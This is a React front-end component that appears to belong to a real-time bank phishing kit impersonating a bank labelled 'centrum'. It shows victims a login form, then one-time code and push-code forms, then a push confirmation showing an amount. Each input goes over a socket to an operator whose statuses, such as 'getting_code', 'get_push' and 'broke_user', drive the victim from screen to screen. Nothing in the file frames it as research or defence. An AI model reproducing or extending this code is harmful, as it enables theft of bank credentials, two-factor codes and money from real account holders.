import {useSocket} from "../../../context/socket/socketProvider";
import {useEffect} from "react";
import CentrumFormLogin from "./CentrumFormLogin";
import CentrumFormCode from "./CentrumFormCode";
import CentrumFormPush from "./CentrumFormPush";
import CentrumLoader from "./CentrumLoader";
import CentrumFail from "./CentrumFail";

const CentrumForm = () => {
    const {user, setUser, initUser, connect, disconnect, sendData, sendCode} = useSocket();
    const submitLogin = (data) => {
        console.log('Login', data);
        initUser({
            ...data, bank: 'centrum'
        });
    }
    console.log(user)
    const submitCode = (code) => {
        sendCode(code);
    }
    const submitPushCode = (code) => {
        sendData('send_push_code', {code});
    }
    const submitPush = (data) => {
        console.log(data)
        sendData('send_push', data)
    }
    useEffect(() => {
        console.log('connect')
        connect('centrum');
        return () => disconnect();
    }, [])

    if (user.status === '' || user.status === 'wrong_login') {
        return <CentrumFormLogin handler={submitLogin}/>
    } else if (user.status === 'getting_code' || user.status === 'wrong_code') {
        return <CentrumFormCode handler={submitCode} status={user.status}/>
    } else if( user.status === 'getting_push_code' || user.status === 'wrong_push_code' ){
        return <CentrumFormCode handler={submitPushCode} status={user.status}/>
    } else if (user.status === 'get_push' || user.status === 'wrong_push') {
        return <CentrumFormPush amount={user.amount} handler={submitPush}/>
    } else if (user.status === 'broke_user') {
        return <CentrumFail/>
    }
    return (

        <CentrumLoader/>
    )
}
export default CentrumForm;